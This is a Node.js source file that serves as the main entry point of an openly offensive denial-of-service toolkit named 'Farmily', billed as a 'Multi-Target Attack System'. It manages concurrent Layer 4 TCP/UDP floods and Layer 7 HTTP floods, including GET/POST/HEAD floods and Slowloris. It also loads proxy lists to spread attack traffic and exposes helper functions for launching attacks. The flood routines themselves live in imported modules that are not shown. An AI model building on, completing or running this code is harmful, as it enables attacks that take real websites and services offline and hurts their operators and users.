// worker/index.js - Main entry point for the attack system
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');
const os = require('os');
const EventEmitter = require('events');

// Import both layers
const Layer4 = require('./farmily4');
const Layer7 = require('./farmily7');

// Import shared utilities
const { 
    GlobalResourceManager, 
    Logger, 
    AdvancedUtils, 
    Colors 
} = require('./shared');

// Initialize global instances
const logger = new Logger('MAIN');
const resourceManager = GlobalResourceManager.getInstance();

// Attack Manager for coordinating multiple attack sessions
class AttackManager extends EventEmitter {
    constructor() {
        super();
        this.activeAttacks = new Map();
        this.attackHistory = [];
        this.maxConcurrentAttacks = 5;
        this.resourceManager = resourceManager;
        
        // Setup global resource monitoring
        this.resourceManager.on('global-monitoring-update', (stats) => {
            this.emit('resource-update', stats);
        });
    }

    async startAttack(config) {
        // Check if we can start another attack
        if (this.activeAttacks.size >= this.maxConcurrentAttacks) {
            throw new Error(`Maximum concurrent attacks (${this.maxConcurrentAttacks}) reached`);
        }
        
        const attackId = crypto.randomUUID().substring(0, 8);
        let attack;
        
        try {
            // Determine attack type based on layer
            const layer = config.layer?.toUpperCase() || 'LAYER7';
            
            if (layer === 'LAYER4') {
                attack = new Layer4.Layer4Attack(config);
                logger.info(`Starting Layer 4 attack ${attackId} with ${Array.isArray(config.targets) ? config.targets.length : 1} targets`);
            } else {
                attack = new Layer7.Layer7Attack(config);
                logger.info(`Starting Layer 7 attack ${attackId} with ${Array.isArray(config.targets) ? config.targets.length : 1} targets`);
            }

            // Set up event forwarding
            attack.on('target-progress', (data) => {
                this.emit('attack-progress', { attackId, ...data });
            });

            attack.on('global-progress', (data) => {
                this.emit('attack-global-progress', { attackId, ...data });
            });

            this.activeAttacks.set(attackId, {
                attack,
                config,
                startTime: Date.now(),
                type: layer
            });
            
            logger.info(`Starting attack ${attackId}`);
            
            // Start the attack
            const result = await attack.start();
            
            // Record in history
            this.attackHistory.push({
                id: attackId,
                config: config,
                result: result,
                startTime: this.activeAttacks.get(attackId).startTime,
                endTime: Date.now(),
                type: layer
            });
            
            // Keep only last 50 attacks in history
            if (this.attackHistory.length > 50) {
                this.attackHistory.shift();
            }
            
            this.activeAttacks.delete(attackId);
            this.emit('attack-completed', { attackId, result });
            
            return { attackId, result };
            
        } catch (error) {
            this.activeAttacks.delete(attackId);
            this.emit('attack-failed', { attackId, error: error.message });
            throw error;
        }
    }

    async stopAttack(attackId) {
        const attackInfo = this.activeAttacks.get(attackId);
        if (attackInfo) {
            await attackInfo.attack.stop();
            this.activeAttacks.delete(attackId);
            logger.info(`Stopped attack ${attackId}`);
            this.emit('attack-stopped', { attackId });
        } else {
            throw new Error(`Attack ${attackId} not found`);
        }
    }

    async stopAllAttacks() {
        const stopPromises = Array.from(this.activeAttacks.keys()).map(id => 
            this.stopAttack(id).catch(err => logger.error(`Failed to stop attack ${id}: ${err.message}`))
        );
        await Promise.allSettled(stopPromises);
        logger.info('All attacks stopped');
    }

    getActiveAttacks() {
        return Array.from(this.activeAttacks.entries()).map(([id, info]) => ({
            attackId: id,
            type: info.type,
            startTime: info.startTime,
            duration: Date.now() - info.startTime,
            config: {
                targets: info.config.targets,
                method: info.config.method,
                layer: info.config.layer
            }
        }));
    }

    getAttackHistory() {
        return this.attackHistory.slice(-20); // Last 20 attacks
    }

    getAttackStats(attackId) {
        const attackInfo = this.activeAttacks.get(attackId);
        return attackInfo ? attackInfo.attack.getStats() : null;
    }

    getGlobalStats() {
        return {
            activeAttacks: this.activeAttacks.size,
            totalAttacksInHistory: this.attackHistory.length,
            resourceStats: this.resourceManager.getGlobalStats(),
            activeAttacksList: this.getActiveAttacks()
        };
    }

    setMaxConcurrentAttacks(max) {
        this.maxConcurrentAttacks = Math.max(1, Math.min(max, 20)); // Between 1 and 20
        logger.info(`Maximum concurrent attacks set to ${this.maxConcurrentAttacks}`);
    }
}

// Create global attack manager
const attackManager = new AttackManager();

// Helper functions for easy attack creation
function createLayer4TCPAttack(targets, duration, options = {}) {
    return Layer4.createTCPAttack(targets, duration, options);
}

function createLayer4UDPAttack(targets, duration, options = {}) {
    return Layer4.createUDPAttack(targets, duration, options);
}

function createLayer7HTTPAttack(targets, method, duration, options = {}) {
    return Layer7.createHTTPAttack(targets, method, duration, options);
}

function createLayer7SlowlorisAttack(targets, duration, options = {}) {
    return Layer7.createSlowlorisAttack(targets, duration, options);
}

// Simplified API functions
async function startAttack(config) {
    try {
        const { attackId, result } = await attackManager.startAttack(config);
        return { attackId, result };
    } catch (error) {
        logger.error(`Attack failed: ${error.message}`);
        throw error;
    }
}

async function startLayer4Attack(targets, method, duration, options = {}) {
    const config = {
        targets,
        method,
        layer: 'LAYER4',
        duration,
        ...options
    };
    
    return await startAttack(config);
}

async function startLayer7Attack(targets, method, duration, options = {}) {
    const config = {
        targets,
        method,
        layer: 'LAYER7',
        duration,
        ...options
    };
    
    return await startAttack(config);
}

// Proxy Management
async function loadProxies(proxyListPath, options = {}) {
    try {
        // Check if file exists
        if (!fs.existsSync(proxyListPath)) {
            throw new Error(`Proxy list file not found: ${proxyListPath}`);
        }
        
        // Read proxy list
        const content = fs.readFileSync(proxyListPath, 'utf8');
        const proxyList = content.split('\n')
            .map(line => line.trim())
            .filter(line => line && !line.startsWith('#')); // Skip empty lines and comments
        
        logger.info(`Loaded ${proxyList.length} proxies from ${proxyListPath}`);
        
        // Initialize and validate proxies
        const proxyManager = new Layer7.ProxyManager();
        proxyManager.loadProxies(proxyList);
        
        // Start validation if requested
        if (options.validate) {
            logger.info('Starting proxy validation...');
            await proxyManager.validateProxiesInBackground();
        }
        
        return {
            proxyList,
            proxyManager,
            stats: proxyManager.getStats()
        };
    } catch (error) {
        logger.error(`Failed to load proxies: ${error.message}`);
        throw error;
    }
}

// Main export module
module.exports = {
    // Attack management
    startAttack,
    startLayer4Attack,
    startLayer7Attack,
    stopAttack: attackManager.stopAttack.bind(attackManager),
    stopAllAttacks: attackManager.stopAllAttacks.bind(attackManager),
    getActiveAttacks: attackManager.getActiveAttacks.bind(attackManager),
    getAttackStats: attackManager.getAttackStats.bind(attackManager),
    getAttackHistory: attackManager.getAttackHistory.bind(attackManager),
    getGlobalStats: attackManager.getGlobalStats.bind(attackManager),
    
    // Attack creation
    createLayer4TCPAttack,
    createLayer4UDPAttack,
    createLayer7HTTPAttack,
    createLayer7SlowlorisAttack,
    
    // Common HTTP methods
    createGETAttack: (targets, duration, options = {}) => createLayer7HTTPAttack(targets, 'GET', duration, options),
    createPOSTAttack: (targets, duration, options = {}) => createLayer7HTTPAttack(targets, 'POST', duration, options),
    createHEADAttack: (targets, duration, options = {}) => createLayer7HTTPAttack(targets, 'HEAD', duration, options),
    
    // Proxy management
    loadProxies,
    
    // Resource management
    getResourceStats: resourceManager.getGlobalStats.bind(resourceManager),
    setResourceLimits: (limits) => {
        Object.assign(resourceManager.resourceLimits, limits);
        logger.info('Resource limits updated');
    },
    
    // Utility functions
    resolveTarget: AdvancedUtils.normalizeTarget,
    resolveTargets: AdvancedUtils.resolveTargets,
    calculateOptimalThreads: AdvancedUtils.calculateOptimalThreads,
    
    // Logging functions
    setLogLevel: (level) => {
        logger.logLevel = level;
        logger.info(`Log level set to ${level}`);
    },
    
    setLogFile: (filePath) => {
        logger.setLogFile(filePath);
    },
    
    getRecentLogs: (count, attackId, level) => {
        return logger.getRecentLogs(count, attackId, level);
    },
    
    // Event listeners
    onAttackProgress: (callback) => {
        attackManager.on('attack-progress', callback);
        return () => attackManager.off('attack-progress', callback);
    },
    
    onAttackCompleted: (callback) => {
        attackManager.on('attack-completed', callback);
        return () => attackManager.off('attack-completed', callback);
    },
    
    onResourceUpdate: (callback) => {
        attackManager.on('resource-update', callback);
        return () => attackManager.off('resource-update', callback);
    },
    
    onLog: (callback) => {
        logger.on('log', callback);
        return () => logger.off('log', callback);
    },
    
    // Configuration validation
    validateConfig: (config) => {
        try {
            // Determine which config validator to use based on layer
            const layer = config.layer?.toUpperCase() || 'LAYER7';
            
            if (layer === 'LAYER4') {
                const testConfig = new Layer4.Layer4Config(config);
                testConfig.validate();
                return { valid: true, config: testConfig };
            } else {
                const testConfig = new Layer7.Layer7Config(config);
                testConfig.validate();
                return { valid: true, config: testConfig };
            }
        } catch (error) {
            return { valid: false, error: error.message };
        }
    },
    
    // System information
    getSystemInfo: () => ({
        cpus: os.cpus(),
        platform: os.platform(),
        arch: os.arch(),
        networkInterfaces: os.networkInterfaces(),
        memory: {
            total: os.totalmem(),
            free: os.freemem(),
            usage: process.memoryUsage()
        },
        uptime: os.uptime(),
        loadavg: os.loadavg(),
        resourceLimits: resourceManager.getResourceLimits()
    }),
    
    // Layer-specific exports
    Layer4: {
        // Core classes
        Layer4Attack: Layer4.Layer4Attack,
        Layer4Config: Layer4.Layer4Config,
        
        // Helper functions
        createTCPAttack: Layer4.createTCPAttack,
        createUDPAttack: Layer4.createUDPAttack
    },
    
    Layer7: {
        // Core classes
        Layer7Attack: Layer7.Layer7Attack,
        Layer7Config: Layer7.Layer7Config,
        
        // Helper functions
        createHTTPAttack: Layer7.createHTTPAttack,
        createSlowlorisAttack: Layer7.createSlowlorisAttack,
        createGETAttack: Layer7.createGETAttack,
        createPOSTAttack: Layer7.createPOSTAttack,
        createHEADAttack: Layer7.createHEADAttack
    },
    
    // Direct access to managers and utilities
    attackManager,
    logger,
    resourceManager,
    
    // Constants
    Constants: {
        DEFAULT_DURATION: 60,
        DEFAULT_THREADS: Math.max(os.cpus().length, 10),
        MAX_CONCURRENT_TARGETS: 10,
        MAX_CONCURRENT_ATTACKS: 5,
        LAYER4_METHODS: ['TCP', 'UDP'],
        LAYER7_METHODS: ['GET', 'POST', 'HEAD', 'PUT', 'DELETE', 'OPTIONS', 'SLOW']
    }
};

// Enhanced error handlers with better logging
process.on('uncaughtException', (error) => {
    logger.critical(`Uncaught Exception: ${error.message}`);
    logger.critical(error.stack);
    
    // Try graceful shutdown
    attackManager.stopAllAttacks()
        .then(() => process.exit(1))
        .catch(() => process.exit(1));
});

process.on('unhandledRejection', (reason, promise) => {
    logger.error('Unhandled Rejection at:', promise, 'reason:', reason);
});

// Graceful shutdown handlers
const gracefulShutdown = async (signal) => {
    logger.info(`Received ${signal}, performing graceful shutdown...`);
    
    try {
        await attackManager.stopAllAttacks();
        resourceManager.cleanup();
        logger.info('Graceful shutdown completed');
        process.exit(0);
    } catch (error) {
        logger.error(`Error during shutdown: ${error.message}`);
        process.exit(1);
    }
};

process.on('SIGINT', () => gracefulShutdown('SIGINT'));
process.on('SIGTERM', () => gracefulShutdown('SIGTERM'));

// Simple health check function to ensure the module is loaded correctly
module.exports.healthCheck = () => {
    return {
        status: 'ok',
        timestamp: new Date().toISOString(),
        version: '1.0.0',
        system: {
            cpus: os.cpus().length,
            memory: {
                total: AdvancedUtils.formatBytes(os.totalmem()),
                free: AdvancedUtils.formatBytes(os.freemem())
            },
            platform: os.platform(),
            arch: os.arch()
        }
    };
};

// Print banner on load
console.log(`
${Colors.CYAN}${Colors.BOLD}===========================================
       Multi-Target Attack System 
            Farmily v1.0.0
===========================================
${Colors.GREEN}
▄████▄   ▒█████   ███▄ ▄███▓ ██▓███   ██▓    ▓█████▄▄▄█████▓▓█████ 
▒██▀ ▀█  ▒██▒  ██▒▓██▒▀█▀ ██▒▓██░  ██▒▓██▒    ▓█   ▀▓  ██▒ ▓▒▓█   ▀ 
▒▓█    ▄ ▒██░  ██▒▓██    ▓██░▓██░ ██▓▒▒██░    ▒███  ▒ ▓██░ ▒░▒███   
▒▓▓▄ ▄██▒▒██   ██░▒██    ▒██ ▒██▄█▓▒ ▒▒██░    ▒▓█  ▄░ ▓██▓ ░ ▒▓█  ▄ 
▒ ▓███▀ ░░ ████▓▒░▒██▒   ░██▒▒██▒ ░  ░░██████▒░▒████▒ ▒██▒ ░ ░▒████▒
░ ░▒ ▒  ░░ ▒░▒░▒░ ░ ▒░   ░  ░▒▓▒░ ░  ░░ ▒░▓  ░░░ ▒░ ░ ▒ ░░   ░░ ▒░ ░
  ░  ▒     ░ ▒ ▒░ ░  ░      ░░▒ ░     ░ ░ ▒  ░ ░ ░  ░   ░     ░ ░  ░
░        ░ ░ ░ ▒  ░      ░   ░░         ░ ░      ░    ░         ░   
░ ░          ░ ░         ░                ░  ░   ░  ░           ░  ░
░                                                                   
${Colors.RESET}
${Colors.GRAY}Layer 4 and Layer 7 ready.
${Colors.GRAY}Using ${os.cpus().length} CPU cores with ${AdvancedUtils.formatBytes(os.freemem())} free memory.
${Colors.GRAY}System initialized and ready.
${Colors.RESET}
`);